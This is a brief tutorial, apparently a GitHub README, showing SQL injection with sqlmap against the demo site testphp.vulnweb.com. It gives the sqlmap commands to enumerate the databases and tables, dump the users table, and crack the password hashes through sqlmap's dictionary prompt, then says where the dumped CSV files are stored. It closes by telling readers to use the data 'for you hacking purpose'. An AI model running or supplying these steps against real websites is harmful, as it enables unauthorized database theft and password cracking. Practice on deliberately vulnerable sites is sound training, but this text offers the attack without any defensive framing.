# Sql Injection:

## 1.Installing sqlmap in kali linux:
    sudo apt-get update
    sudo apt-get upgrade -y
    sudo apt-get install sqlmap
## 2.About Sqlmap working
    man sqlmap

![Screenshot 2025-05-29 164447](https://github.com/user-attachments/assets/c12598a3-0058-4355-8fc6-131a5793c28b)



## 3.Attacking
     sqlmap -u <website link> http://testphp.vulnweb.com/listproducts.php?cat=1  -dbs

     ![Screenshot 2025-05-29 164651](https://github.com/user-attachments/assets/d63353d2-d1fb-4d69-92e9-423ab73313ee)



## 4.Getting database details

After getting the deatils of the Database managament (DBMS) of the database and with that we will also get the tables and coloumns of the database now we target the (DBMS) and in that the tables we target so, for that the command is

        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
![Screenshot 2025-05-29 164732](https://github.com/user-attachments/assets/978ba1d1-8161-4474-8d04-943723a9041a)


## 5.dump data

After getting the deatils of the tables which the database has then we procced and download all the Data which the 'user' contain.

      sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart -T users --dump-all

![Screenshot 2025-05-29 164825](https://github.com/user-attachments/assets/237de1c6-0cfe-4324-9bc3-361306c69912)



      writing hashes to a temporary file '/tmp/sqlmapkis89bs647009/sqlmaphashes-aaiq4oy_.txt' 
      do you want to crack them via a dictionary-based attack? [Y/n/q] Y
      using hash method 'md5_generic_passwd'
      what dictionary do you want to use?
      [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
      [2] custom dictionary file
      [3] file with list of dictionary files
      > 1
      using default dictionary
      do you want to use common password suffixes? (slow!) [y/N] N


![Screenshot 2025-05-29 164918](https://github.com/user-attachments/assets/5a627331-87c1-40eb-bc05-d443848158f6)




**After that the data is saved as the .csv file and by default all the tables is dumped and stored and the path is given at the last where it stored**

        /home/kali/.local/share/sqlmap/output/testphp.vulnweb.com

![Screenshot 2025-05-29 165001](https://github.com/user-attachments/assets/3e11c7b7-c419-4fe4-9da1-273dee6abe19)

 

**Now just cd into the directory and cat the files and use the data for you hacking purpose.**
